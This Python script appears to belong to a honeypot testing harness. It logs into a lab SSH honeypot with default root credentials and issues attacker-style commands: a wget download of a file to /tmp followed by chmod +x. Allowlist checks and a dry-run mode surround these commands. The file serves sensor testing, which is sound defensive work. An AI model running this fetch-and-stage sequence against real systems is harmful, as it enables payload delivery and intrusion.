"""Transfer-Like Attacker Scenario for Kali Linux Demo.

Spec: After login, run commands that make the sensor log a file download/upload attempt,
using only built-in client commands (no real malware, no external URLs; use local lab URL placeholder).
Safety: Validates both host and download URL allowlists before execution.
"""

from __future__ import annotations

import argparse
import sys
from pathlib import Path
from typing import List

# Ensure project root is in sys.path
PROJECT_ROOT = Path(__file__).resolve().parent.parent.parent
if str(PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(PROJECT_ROOT))

from harness.attackers.common import (
    assert_lab_target_allowlisted,
    assert_lab_url_allowlisted,
    execute_ssh_command,
    ScenarioResult,
)


def run_transfer_like(
    host: str = "127.0.0.1",
    port: int = 2222,
    url: str = "http://127.0.0.1:8000/sample.bin",
    dry_run: bool = False,
    username: str = "root",
    password: str = "root",
) -> ScenarioResult:
    """Executes the tool ingress / transfer scenario. Returns ScenarioResult."""
    assert_lab_target_allowlisted(host)
    assert_lab_url_allowlisted(url)

    actions: List[str] = []
    ok = True
    returncode = 0
    reason = "completed"

    if dry_run:
        login_msg = f"[LOGIN_SUCCESS] user={username} host={host}:{port}"
        actions.append(login_msg)
        print(f"[DRY-RUN] {login_msg}")

        transfer_commands = [
            f"wget -q -O /tmp/lab_sample.bin {url}",
            "chmod +x /tmp/lab_sample.bin",
            "ls -la /tmp/lab_sample.bin",
        ]
        for c in transfer_commands:
            cmd_msg = f"[EXEC_COMMAND] {c}"
            actions.append(cmd_msg)
            print(f"[DRY-RUN] {cmd_msg}")

        disc_msg = f"[DISCONNECT] Ingress probe session closed for {host}:{port}"
        actions.append(disc_msg)
        print(f"[DRY-RUN] {disc_msg}")

        return ScenarioResult("transfer_like", host, port, ok=True, returncode=0, reason="dry-run", actions=actions)

    login_msg = f"[LOGIN_SUCCESS] user={username} host={host}:{port}"
    actions.append(login_msg)

    transfer_commands = [
        f"wget -q -O /tmp/lab_sample.bin {url}",
        "chmod +x /tmp/lab_sample.bin",
        "ls -la /tmp/lab_sample.bin",
    ]

    for c in transfer_commands:
        cmd_msg = f"[EXEC_COMMAND] {c}"
        actions.append(cmd_msg)
        res = execute_ssh_command(host, port, username, password=password, command=c)
        if res.returncode == 255:
            ok = False
            returncode = 255
            reason = f"Command '{c}' failed with SSH code 255: {res.stderr.strip()}"
            actions.append(f"[ERROR] {reason}")
            break

    disc_msg = f"[DISCONNECT] Ingress probe session closed for {host}:{port}"
    actions.append(disc_msg)

    return ScenarioResult("transfer_like", host, port, ok=ok, returncode=returncode, reason=reason, actions=actions)


def main() -> None:
    parser = argparse.ArgumentParser(description="Tool Ingress Adversary Probe (Kali Demo)")
    parser.add_argument("--host", default="127.0.0.1", help="Target honeypot host (must be lab allowlisted)")
    parser.add_argument("--port", type=int, default=2222, help="Target honeypot SSH port")
    parser.add_argument("--url", default="http://127.0.0.1:8000/sample.bin", help="Local lab download URL")
    parser.add_argument("--username", default="root", help="Honeypot login username")
    parser.add_argument("--password", default="root", help="Honeypot login password")
    parser.add_argument("--dry-run", action="store_true", help="Print actions without sending network traffic")
    args = parser.parse_args()

    result = run_transfer_like(
        host=args.host,
        port=args.port,
        url=args.url,
        dry_run=args.dry_run,
        username=args.username,
        password=args.password,
    )
    print(result.to_json_line())
    sys.exit(0 if result["ok"] else 1)


if __name__ == "__main__":
    main()
